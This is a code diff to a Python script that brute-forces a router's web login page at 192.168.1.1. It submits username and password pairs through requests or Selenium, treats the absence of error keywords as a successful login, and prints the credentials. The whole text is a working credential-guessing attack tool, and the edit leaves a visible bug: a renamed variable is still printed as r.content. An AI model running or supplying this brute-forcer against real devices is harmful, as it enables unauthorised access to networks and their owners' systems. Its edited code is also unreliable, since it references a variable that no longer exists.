@@ -7,14 +7,15 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 
-url = "http://192.168.1.1"  # Check the address in address.md for the default IP address of routers.
+url = "http://192.168.1.1"
 
-expression = {b"error", b"incorrect", b"failure", b"try", b"again", b"invalid", b"upgrade"}  # Changed to bytes-like object.
+expression = {b"error", b"incorrect", b"failure", b"try", b"again", b"invalid", b"upgrade"}
 
 def brute(username, password, combinations_tested, use_selenium=False):
     session = HTMLSession()
     try:
-        r = session.post(url, data={'username': username, 'password': password}, verify=False)
+        a = session.post(url, data={'username': username, 'password': password}, verify=False)
+        r_content = a.content.lower()
     except requests.exceptions.SSLError as e:
         print("SSL Error:", e)
         sys.exit(1)
@@ -45,11 +46,14 @@ def brute(username, password, combinations_tested, use_selenium=False):
             password_input.send_keys(password)
             password_input.submit()
             print("Form submission successful")
-            if not any(item in driver.page_source.encode('utf-8') for item in expression):
+
+            driver_lower_content = driver.page_source.lower().encode('utf-8')
+            
+            if not any(item in driver_lower_content for item in expression):
                 print("\nBrute Forcing...")
                 print("[+] Username: ", username)
                 print("[+] Password: ", password)
-                print("Server Response:", driver.page_source.encode('utf-8'))  # Print server response content
+                print("Server Response:", driver.page_source.encode('utf-8'))
                 sys.exit()
             else:
                 print("Success condition not met")
@@ -59,11 +63,11 @@ def brute(username, password, combinations_tested, use_selenium=False):
         finally:
             driver.quit()
             return combinations_tested
-    elif not any(item in r.content for item in expression):
+    elif not any(item in r_content for item in expression):
         print("\nBrute Forcing...")
         print("[+] Username: ", username)
         print("[+] Password: ", password)
-        print("Server Response:", r.content)  # Print server response content
+        print("Server Response:", r.content)
         sys.exit()
     else:
         print("Upgrade condition not met")
@@ -81,7 +85,7 @@ def main():
                 if not use_selenium and b"upgrade" in requests.post(url, data={'username': username, 'password': password}, verify=False).content:
                     use_selenium = True
     except KeyboardInterrupt:
-        print("\n\033[91mExiting...\033[0m")  # Print "Exiting..." in red
+        print("\n\033[91mExiting...\033[0m")
 
 if __name__ == '__main__':
     requests.packages.urllib3.disable_warnings()
